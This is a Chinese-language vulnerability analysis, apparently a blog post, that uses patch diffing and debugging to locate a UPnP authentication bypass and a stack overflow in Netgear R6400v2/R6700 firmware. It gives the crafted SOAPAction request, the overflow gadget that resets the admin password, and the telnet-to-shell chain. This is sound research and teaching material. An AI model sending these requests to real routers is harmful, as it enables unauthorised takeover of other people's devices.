> 原文链接: https://www.anquanke.com//post/id/209232 


# Pwn2Own-Netgear-R6700-UPnP漏洞分析


                                阅读量   
                                **171922**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t01f6057f114a9af632.png)](https://p1.ssl.qhimg.com/t01f6057f114a9af632.png)



## 前言

6月15日，`ZDI`发布了有关`NETGEAR` `R6700`型号路由器的10个`0 day`的安全公告，其中有2个关于`UPnP`的漏洞：[认证绕过](https://www.zerodayinitiative.com/advisories/ZDI-20-703/)和[缓冲区溢出](https://www.zerodayinitiative.com/advisories/ZDI-20-704/)。通过组合这2个漏洞，在`Pwn2Own Tokyo 2019`比赛中，来自`Team Flashback`的安全研究员`Pedro Ribeiro`和`Radek Domanski`成功在`R6700v3`设备上实现代码执行。

6月17日，`NETGEAR`官方发布了[安全公告](https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders)，并针对`R6400v2`和`R6700v3`这2个型号的设备发布了补丁。由于此时还没有这2个漏洞的具体细节，于是打算通过补丁比对的方式对漏洞进行定位和分析。



## 补丁比对

选取`R6400v2`型号作为目标设备，根据`NETGEAR`官方的安全公告，选取`R6400v2-V1.0.4.82`和`R6400v2-V1.0.4.92`两个版本进行比对分析。

> 当时`R6400v2-V1.0.4.92`为最新的补丁版本，后来`NETGEAR`官方对安全公告进行了更新，目前最新的补丁版本为`R6400v2-V1.0.4.94`。

由于漏洞与`UPnP`服务有关，于是对`upnpd`程序进行分析，`Bindiff`比对的结果如下。

[![](https://p2.ssl.qhimg.com/t01ebeb4ebb1afb595e.png)](https://p2.ssl.qhimg.com/t01ebeb4ebb1afb595e.png)

由图可知，存在差异的重要函数共7个。逐个对函数进行比对和分析，最终定位到`sub_00024D80()`函数中(补丁版本)。

[![](https://p3.ssl.qhimg.com/t019777cf369376f8a6.png)](https://p3.ssl.qhimg.com/t019777cf369376f8a6.png)

可以看到，在`V1.0.4.92`补丁版本中，在调用`memcpy()`之前增加了一个长度校验，很有可能这里就是漏洞修复点。两个函数对应的伪代码如下，在补丁版本中，除了增加对`memcpy()`长度参数的校验外，`sscanf()`的格式化参数也发生了变化，可能在调用`sscanf()`时就会出现溢出。另外，结合该函数中的字符串`sa_setBlockName`，与`ZDI`漏洞公告中的描述相符，因此猜测这里就是栈溢出漏洞点。

> 为了便于阅读，已对部分函数进行了重命名。

[![](https://p2.ssl.qhimg.com/t019e085201b3e6e54f.png)](https://p2.ssl.qhimg.com/t019e085201b3e6e54f.png)

另外，通过补丁比对的方式，暂时未定位到认证绕过漏洞。



## 漏洞利用限制

`upnpd`程序启用的缓解措施如下：仅启用了`NX`机制，同时程序的加载基址为`0x8000`。此外，设备上的`ALSR`等级为1，且`upnpd`程序崩溃后并不会重启。

```
$ checksec --file ./usr/sbin/upnpd 
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

根据上述信息，在无信息泄露的前提下，要想利用漏洞实现任意代码执行，最大的难题是`NULL`字符截断的问题。由于`upnpd`程序中`.text`段地址的最高字节均为`'x00'`，在覆盖返回地址后，后面的payload无法传入，因此只有一次覆盖返回地址的机会。想过尝试利用单次覆盖的机会泄露地址信息，但由于`upnpd`程序崩溃后不会重启，似乎也不可行。在尝试常规思路无果后，于是求助于`Pedro Ribeiro`，`Pedro Ribeiro`表示不便提前透露，但近期会公布漏洞细节。

> 在其他设备中也遇到过`NULL`字符截断的问题，故对这个漏洞如何利用更感兴趣，暂时未对调用路径进行详细分析。



## 漏洞分析

6月25日，`Pedro Ribeiro`在`GitHub`上公布了[漏洞细节](https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md)，并告知了我 ( 非常感谢:) )。结合`Pedro Ribeiro`的`write up`，加上有了可调试的真实设备，对这两个漏洞的细节有了更进一步的了解。

> 感兴趣的可以去看一下`Pedro Ribeiro`的`write up`，很详细。

### `SOAP`消息

`upnpd`程序会监听`5000/tcp`端口，其主要通过`SOAP`协议来进行数据传输，这两个漏洞存在于对应的`POST`请求中。`SOAP`是一个基于`XML`的协议，一条`SOAP`消息就是一个普通的`XML`文档，其包含`Envelope`、`Header`(可选)、`Body`和`Fault`(可选)等元素。针对该设备，一个`POST`请求示例如下。

```
// 省略部分内容
POST soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin

&lt;?xml version="1.0"?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
SetNetgearDeviceName
&lt;NewBlockSiteName&gt;123456
&lt;/NewBlockSiteName&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

### <a class="reference-link" name="%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"></a>缓冲区溢出

栈溢出漏洞存在于`sa_setBlockName()`函数内的`sscanf()`处，漏洞本身比较简单，但还需要对调用路径进行分析看如何触发。在`V1.0.4.82`版本中，函数`sa_setBlockName()`的调用路径如下。

[![](https://p4.ssl.qhimg.com/t01bdc23eb1a7a8598b.png)](https://p4.ssl.qhimg.com/t01bdc23eb1a7a8598b.png)

**`sa_parseRcvCmd()`函数**

在函数`sa_parseRcvCmd()`内，需要使得`(3)`处的条件成立，即`v7=0xFF37`。`(2)`处循环及其后面的代码主要是查找标签并返回其索引(类型?)，同时解析标签中的内容，而在`(1)`处`v4`指向对应的标签名称表，其部分内容如下。因此，请求数据中需要包含`&lt;NewBlockSiteName&gt;`标签。

```
int __fastcall sa_parseRcvCmd(char *a1, signed int a2)
`{`
  v2 = 0; haystack = a1; v76 = a2; v3 = strstr(haystack, ":Body&gt;");
  memcpy(&amp;v82, haystack, 0x31u);
  v83 = 0;
  if ( !v3 )
    return 702;
  v4 = dword_7DA44;  // (1) 指向标签名称及索引表
  memset(dword_D96CC, 0, 0x5F0u);
  v5 = off_7DA48; v72 = dword_7DA4C;
  if ( off_7DA48 == "END_OF_FILE" )
    return v2;
  v73 = v3 + 6; whence = 0; v6 = 0; v71 = 0; v75 = 0; buf = 0;
  while ( 1 )  // (2) 查找标签,并获取其中的内容
  `{`
    // ...
    v7 = *v4;
    // ...
    snprintf((char *)&amp;s, 0x32u, "&lt;%s", v5);
    snprintf((char *)&amp;v84, 0x32u, "&lt;/%s&gt;", v5);
    v8 = strstr(v73, (const char *)&amp;s);
    if ( !v8 )
      goto LABEL_25;
    v9 = strchr(v8, '&gt;'); v10 = v7 == 0xFF3A || v7 == 0xFF13;
    src = v9 + 1;
    if ( v10 )
      break;
    v6 = strstr(src, (const char *)&amp;v84);
    if ( v6 )
      goto LABEL_12;
    wrap_vprintf(2, "%d, could not found %sn", 0x4C6, &amp;v84);
LABEL_25:
    if ( v4 != &amp;dword_7E368 &amp;&amp; v71 &lt;= 19 )
    `{`
      v5 = (char *)v4[4]; v17 = v4[5]; v4 += 3; v72 = v17;
      if ( v5 != "END_OF_FILE" )
        continue;
    `}`
    return 0;
  `}`
  // ...
  if ( v7 == 0xFF13 )
  `{`
    // ...
    `}`
LABEL_20:
    if ( v7 == 0xFF37 )  // (3) 对应标签NewBlockSiteName
    `{`
      if ( buf )
      `{`
        dword_D96CC[19 * v71] = 0xFF37;
        return sa_setBlockName(src, (int)buf);
      // ...
```

```
; 标签名称和索引(类型?)表
.data:0007DA44 dword_7DA44     DCD 0xFF00                                                 
.data:0007DA48 off_7DA48       DCD aNewenable          ; "NewEnable"
.data:0007DA4C dword_7DA4C     DCD 1                              
; ...
.data:0007DCE4                 DCD 0xFF37
.data:0007DCE8                 DCD aNewblocksitena     ; "NewBlockSiteName"
.data:0007DCEC                 DCD 0x3E8
```

**`sa_processResponse()`函数**

在`sa_processResponse()`函数内，在`(1)`处根据`soap_action`的类型进入不同的处理分支，在`case 0`中有多处(`SetDeviceNameIconByMAC`，`SetDeviceInfoByMAC`，`SetNetgearDeviceName`)会跳到分支`LABEL_184`，满足一定条件后在`(2)`处会调用`sa_parseRcvCmd()`，同样`case 1`中也有多处会跳到`LABEL_184`分支，之后会调用`sa_parseRcvCmd()`。

```
unsigned int sa_processResponse(int a1, char *a2, int a3, signed int a4, char *a5)
`{`
  v5 = (void *)a1; v6 = a2;
  switch ( (unsigned int)v5 )  // (1) soap action type
  `{`
    case 0u:  // 对应service：DeviceInfo
      if ( sa_findKeyword((int)v6, 0) == 1 ) // GetInfo
        goto LABEL_241;
      if ( sa_findKeyword((int)v6, 0xB1) == 1 ) // SetDeviceNameIconByMAC
      `{` v12 = 177; goto LABEL_184; `}`
      if ( sa_findKeyword((int)v6, 0xB9) == 1 ) // SetDeviceInfoByMAC
      `{` v12 = 185; goto LABEL_184; `}`
      if ( sa_findKeyword((int)v6, 0xBA) == 1 ) // SetNetgearDeviceName
      `{` v12 = 186; goto LABEL_184; `}`
      // ...
    case 1u:  // 对应service：DeviceConfig
      if ( sa_findKeyword((int)v6, 0xB8) == 1 ) // SOAPLogin
      `{` v10 = 184; v11 = -1; goto LABEL_242; `}`
      // ...
      if ( sa_findKeyword((int)v6, 0xB6) == 1 ) // RecoverAdminPassword
      `{` v12 = 182; goto LABEL_184; `}`
      // ...
    case 7u:  // 对应service：ParentalControl
      if ( sa_findKeyword((int)v6, 71) == 1 ) // GetAllMACAddresses
      `{` v10 = 71; v11 = -1; goto LABEL_242; `}`
      // ...
LABEL_184:
      wrap_vprintf(3, "%s()n", "sa_checkSessionID");
      v13 = strstr(v6, "SessionID");
      if ( !v13 )
        goto LABEL_759;
      v14 = v13 + 9; v15 = strchr(v13 + 9, 62); v16 = strstr(v14, "&lt;/");
      v17 = v15 == 0;
      if ( v15 )
        v17 = v16 == 0;
      if ( !v17
        &amp;&amp; ((v18 = v15 + 1, v16 &gt;= v15 + 1) ? (v19 = v16 - (_BYTE *)v18) : (v19 = (_BYTE *)v18 - v16), v19 &lt;= 0x27) )
      `{` /* ... */ `}`
      else
      `{` /* ... */ `}`
      if ( v12 != 0x2D )
      `{`
        if ( v12 == 0x4E )
        `{` /* ... */ `}`
        else
        `{`
          if ( v12 != 0x5C )
          `{`
LABEL_196:
            v8 = sa_parseRcvCmd(v6, v75);  // (2)
            // ...
```

其中，`sa_findKeyword()`函数主要是根据指定的`index`在表中查找对应的`keyword`，对应表的部分内容如下。

```
.data:0007D47C dword_7D47C     DCD 0                   
.data:0007D480                 DCD aGetinfo            ; "GetInfo"
; ...
.data:0007D9EC                 DCD 0xB1
.data:0007D9F0                 DCD aSetdevicenamei     ; "SetDeviceNameIconByMAC"
; ...
.data:0007DA14                 DCD 0xB9
.data:0007DA18                 DCD aSetdeviceinfob     ; "SetDeviceInfoByMAC"
; ...
.data:0007DA1C                 DCD 0xBA
.data:0007DA20                 DCD aSetnetgeardevi     ; "SetNetgearDeviceName"
; ...
.data:0007DA2C                 DCD 0xB6
.data:0007DA30                 DCD aRecoveradminpa     ; "RecoverAdminPassword"
; ...
.data:0007DA34                 DCD 0xB8
.data:0007DA38                 DCD aSoaplogin          ; "SOAPLogin"
```

综上，通过构造如下所示的`SOAP`消息，即可到达漏洞点。

```
&lt;?xml version="1.0"?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
SetNetgearDeviceName        // SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行
&lt;NewBlockSiteName&gt;123
&lt;/NewBlockSiteName&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
```

### <a class="reference-link" name="%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"></a>认证绕过

在前面的分析中，选择通过`case 0`中的`SetNetgearDeviceName`(或`SetDeviceNameIconByMAC`、`SetDeviceInfoByMAC`)去触发漏洞，这就涉及到认证绕过漏洞了。

```
signed int __fastcall sa_method_check(char *a1, int a2, char *a3, signed int a4)
`{`
  request_ptr = a1;   // point to the start of http request
  v5 = a2; v6 = a3; v7 = a4; v8 = 0;
  v9 = dword_8F5B8;
  LOBYTE(dword_BFEC4) = 0;
  *(_WORD *)((char *)&amp;dword_BFEC4 + 1) = 0;
  HIBYTE(dword_BFEC4) = 0;
  if ( dword_8F5B8 == 1 )
    return sub_2BCE0(0x20000, aXmlVersion10En_87, v5, v9);
  v11 = stristr(request_ptr, aSoapaction_0);    // (1) 查找"SOAPAction:"
  if ( !v11 )
    return -1;
  v12 = aDeviceinfo;
  v13 = (const char *)(v11 + strlen(aSoapaction_0));
  while ( 1 )  // (2) 在表中查找具体的SOAPAction操作, 并获取对应的soap_action type
  `{`
    v14 = v12; dword_9DCF4 = (int)v12; v12 += 30;
    if ( stristr(v13, v14) )
      break;
    if ( ++v8 == 11 )
    `{`
      soap_action_index = -1; goto LABEL_10;
    `}`
  `}`
  soap_action_index = v8;
LABEL_10:
  // ...  
  v19 = (const char *)stristr(request_ptr, "Cookie:");
  v20 = (const char *)stristr(request_ptr, "SOAPAction:");
  v21 = (size_t)v20;
  v22 = strchr(v20, 'r');
  *v22 = v18; v23 = v21; n = v22;
  v24 = stristr(v23, "service:DeviceConfig:1#SOAPLogin") == 0;
  if ( !v19 )
    v24 = 0;
  *n = 13;
  if ( !v24 || (v25 = strchr(v19, 'r'), (v87 = v25) == 0) )
  `{`
LABEL_52:
    strncpy((char *)&amp;unk_D9050, "", 0x13u);
    v44 = inet_ntoa((struct in_addr)v6);
    strncpy((char *)&amp;unk_D9050, v44, 0x13u);
    v45 = inet_ntoa((struct in_addr)v6);
    v46 = (const char *)acosNvramConfig_get("lan_ipaddr");
    if ( strcmp(v45, v46)  // (3) 需保证判断条件为false
      &amp;&amp; strncmp(v13, " urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate", 0x3Au)
      &amp;&amp; strncmp(v13, " "urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"", 0x3Cu)
      &amp;&amp; strncmp(v13, " urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin", 0x34u)
      &amp;&amp; strncmp(v13, " "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"", 0x36u)
      &amp;&amp; strncmp(v13, " urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo", 0x30u) )
    `{`
      // ...
    `}`
    goto LABEL_27;
  `}`
  // ...
LABEL_27:
  if ( strcmp((const char *)dword_9DCF4, "ParentalControl") )
    goto LABEL_28;
  // ...
LABEL_28:
  if ( soap_action_index == -1
    || (v31 = (const char *)dword_9DCF4,
        wrap_vprintf(3, "%s()n", "sa_saveXMLServiceType"),
        memset(byte_9FA30, 0, 0x64u),
        (v32 = stristr(request_ptr, "urn:")) == 0)
    || (v33 = (const void *)stristr(v32 + 4, ":")) == 0
    || (v34 = stristr(request_ptr, v31)) == 0 )
  `{`
LABEL_50:
    v9 = 401;
    return sub_2BCE0(0x20000, aXmlVersion10En_87, v5, v9);
  `}`
  v35 = strlen(v31);
  strcat(byte_9FA30, "urn:NETGEAR-ROUTER");
  v36 = strlen(byte_9FA30);
  memcpy(&amp;byte_9FA30[v36], v33, v34 + v35 - (_DWORD)v33);
  strcat(byte_9FA30, ":1");
  v37 = sa_processResponse(soap_action_index, request_ptr, v5, v7, v6);  // (4)
```

在`sa_method_check()`函数中，在`(1)`处查找`POST`请求中的`SOAPAction:`头，`(2)`处在表中查找具体的`SOAPAction`服务并获取对应的类型(索引?)，表中包含的服务名称及其顺序如下。

```
.data:0007E380 aDeviceinfo             DCB "DeviceInfo",0      
.data:0007E39E aDeviceconfig           DCB "DeviceConfig",0
.data:0007E3BC aWanipconnectio_0     DCB "WANIPConnection",0
.data:0007E3DA aWanethernetlin_0     DCB "WANEthernetLinkConfig",0
.data:0007E3F8 aLanconfigsecur         DCB "LANConfigSecurity",0
.data:0007E416 aWlanconfigurat         DCB "WLANConfiguration",0
.data:0007E434 aTime                   DCB "Time",0
.data:0007E452 aParentalcontro         DCB "ParentalControl",0
.data:0007E470 aAdvancedqos            DCB "AdvancedQoS",0
.data:0007E48E aUseroptionstc          DCB "UserOptionsTC",0
.data:0007E4AC aEndOfFile_0            DCB "END_OF_FILE",0
```

为了使得程序能执行到`(4)`，需要使得`(3)`处的判断条件不成立，即`SOAPAction`头部需包含以下三个之一。在`(3)`处还有一个对`ip`的判断，但这个似乎不太好伪造。
- `urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate`
- `urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin`
- `urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo`
访问以上3个`SOAPAction`是无需认证的，似乎到这里直接发送如下`POST`请求就可以到达溢出漏洞点了。

```
POST soap/server_sa/ HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin

&lt;?xml version="1.0"?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
SetNetgearDeviceName        // SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行
&lt;NewBlockSiteName&gt;123
&lt;/NewBlockSiteName&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

但是在`sa_processResponse()`函数中，在根据`soap_action`的类型进入分支处理时，`urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo`和`urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin`这2项会分别匹配对应`case` 分支的第1条`if`语句，从而跳转到其他地方，而`urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate`对应的`case`分支中的跳转都是跳到其他地方。因此，直接访问以上3个`SOAPAction`，程序执行流程不会到达溢出漏洞点。

```
unsigned int __fastcall sa_processResponse(int a1, char *a2, int a3, signed int a4, char *a5)
`{`

  v5 = (void *)a1; v6 = a2;
  switch ( (unsigned int)v5 )
  `{`
    case 0u:  // 对应service：DeviceInfo
      if ( sa_findKeyword((int)v6, 0) == 1 ) // GetInfo
        goto LABEL_241;  // (1) &lt;=== 跳转到其他分支
      if ( sa_findKeyword((int)v6, 0xB1) == 1 ) // SetDeviceNameIconByMAC
      `{` v12 = 177; goto LABEL_184; `}`
      if ( sa_findKeyword((int)v6, 0xB9) == 1 ) // SetDeviceInfoByMAC
      `{` v12 = 185; goto LABEL_184; `}`
      if ( sa_findKeyword((int)v6, 0xBA) == 1 ) // SetNetgearDeviceName
      `{` v12 = 186; goto LABEL_184; `}`
      // ...
    case 1u:  // 对应service：DeviceConfig
      if ( sa_findKeyword((int)v6, 0xB8) == 1 ) // SOAPLogin
      `{` v10 = 184; v11 = -1; goto LABEL_242; `}`  // (2) &lt;=== 跳转到其他分支
      // ...
    case 7u:  // 对应service：ParentalControl
      if ( sa_findKeyword((int)v6, 71) == 1 ) // GetAllMACAddresses
      `{` v10 = 71; v11 = -1; goto LABEL_242; `}`  // (3) &lt;=== 全部跳转到其他分支
      // ...
```

那么如何才到达溢出漏洞点且无需认证呢？考虑到在查找`SOAPAction`服务和`SOAPAction`对应的关键字时采用的是`stristr()`函数，即直接进行字符串匹配查找，而没有考虑字符串具体的位置，可以通过发送如下`POST`请求绕过认证并达到溢出漏洞点。

```
// 省略部分内容
POST soap/server_sa HTTP/1.1
SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLoginDeviceInfo

&lt;?xml version="1.0"?&gt;
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
SetNetgearDeviceName
&lt;NewBlockSiteName&gt;123456
&lt;/NewBlockSiteName&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;

```

首先，在`sa_method_check()`中，在查找`SOAPAction`服务时，对应的表项`DeviceInfo`排在`DeviceConfig`之前，因此会匹配到`DeviceInfo`，对应的`soap_action`类型为0。其次，在对`SOAPAction`头部进行判断时，某个`strncmp()`会比对成功返回0，使得对应的`if`条件为`false`，程序继续执行后会调用`sa_processResponse()`。在`sa_processResponse()`中，由于`soap_action`的类型为0，程序会进入`case 0`分支，在查找关键字时会匹配到下面的`SetNetgearDeviceName`，因而会跳到对应的分支继续执行，最终到达溢出漏洞点。



## 漏洞利用

现在可以绕过认证并触发溢出漏洞了，该如何对溢出漏洞进行利用呢？溢出时的`crash`信息如下，可以看到，寄存器`r4`~`r8`和`pc`的内容都被覆盖了。

```
(gdb) c                                                                   
Continuing.                                                               

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x63636362                                
0x63636362 in ?? ()                                                       
(gdb) i r                                                                 
r0             0x0      0                                                 
r1             0x662bc  418492                                            
r2             0x662bc  418492                                            
r3             0xbeece355       3203195733                                
r4             0x61616161       1633771873                                
r5             0x61616161       1633771873                                
r6             0x61616161       1633771873                                
r7             0x61616161       1633771873                                
r8             0x62626262       1650614882                                
r9             0x1      1                                                 
r10            0x0      0                                                 
r11            0xbeeccf80       3203190656                                
r12            0x0      0                                                 
sp             0xbeeccbb0       0xbeeccbb0                                
lr             0x24c38  150584                                            
pc             0x63636362       0x63636362                                
cpsr           0x60000030       1610612784                                
(gdb) x/10wx $sp-0x10                                                     
0xbeeccba0:     0x61616161      0x61616161      0x62626262      0x63636363
0xbeeccbb0:     0x00000000      0x0000ff37      0x0000041e      0xbeeccf80
0xbeeccbc0:     0xbeeccf4c      0x00000002
```

前面提到过，若想要实现任意代码执行，需要解决`NULL`字符截断的问题。在仅有一次覆盖返回地址的机会时，该如何构造`payload`呢? 在有限的条件下，`Pedro Ribeiro`采取了一种巧妙的方式，通过单次覆盖来修改设备管理员账户的密码，而`upnpd`程序中正好存在这一代码片段。这段代码不依赖于其他的寄存器以及栈空间内容等，跳转执行成功后程序还是会崩溃，但管理员账户的密码已成功修改成`password`。

```
; V1.0.4.82 版本
.text:00039A58 LDR             R0, =aHttpPasswd ; "http_passwd"
.text:00039A5C LDR             R1, =aPassword ; "password"
.text:00039A60 BL              acosNvramConfig_set
```

有了管理员账户和密码后，可以登录设备的管理界面，对设备的配置进行修改，但如何获取设备的`shell`以实现代码执行呢?`Pedro Ribeiro`指出，在`R6700v3`型号的设备上，可以通过某种方式开启设备的`telnet`服务，再利用已有的管理员账号和密码登录，即可获取设备的`shell`。

`Pedro Ribeiro`给出的完整利用流程如下：
- 结合认证绕过漏洞和缓冲区溢出漏洞，通过发送`POST`请求来修改管理员账号的密码；
- 利用已有的管理员账号和密码，登录web页面，再次修改管理员账号的密码；
- 通过向设备的`23/udp`端口发送`telnetenable`数据包，以开启`telnet`服务；
<li>利用已有的管理员账号和密码，登录`telnet`服务，即可成功获取设备的`shell`
</li>


## 小结

本文从补丁比对出发，结合`Pedro Ribeiro`的`write up`，对`NETGEAR` `R6400v2`型号设备中的`UPnP`漏洞进行了定位和分析。
<li>认证绕过：在对`SOAPAction`头进行解析和处理时，由于缺乏适当的校验，可通过伪造`SOAPAction`头部来绕过认证，从而访问某些`API`
</li>
- 缓冲区溢出：在解析和处理`POST`请求中的数据时，由于缺乏长度校验，通过伪造超长的数据，最终会造成在`sa_setBlockName()`函数中出现缓冲区溢出
栈溢出漏洞本身比较简单，但漏洞利用却存在`NULL`字符截断的问题，在只有一次覆盖返回地址的机会时，`Pedro Ribeiro`采用了一种巧妙的方式，值得借鉴和学习。



## 相关链接
- [(0Day) (Pwn2Own) NETGEAR R6700 UPnP SOAPAction Authentication Bypass Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-20-703/)
- [(0Day) (Pwn2Own) NETGEAR R6700 UPnP NewBlockSiteName Stack-based Buffer Overflow Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-20-704/)
- [Security Advisory for Multiple Vulnerabilities on Some Routers, Mobile Routers, Modems, Gateways, and Extenders](https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders)
- [tokyo_drift](https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md)
- [SOAP 介绍](https://segmentfault.com/a/1190000003762279)